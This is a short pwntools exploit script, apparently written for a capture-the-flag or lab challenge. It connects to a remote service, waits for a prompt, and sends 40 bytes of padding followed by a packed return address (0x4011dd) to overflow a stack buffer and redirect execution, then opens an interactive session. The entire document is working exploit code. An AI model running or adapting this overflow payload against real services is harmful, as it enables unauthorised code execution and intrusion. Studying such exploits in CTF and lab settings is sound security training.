from pwn import *
r = remote('up.zoolab.org', '30001')
#r = process('./arch_check')
r.recvuntil('Just wanna ask')
target_address = p64(0x4011dd)
r.sendline(b'A' * 40 + target_address)
r.interactive()
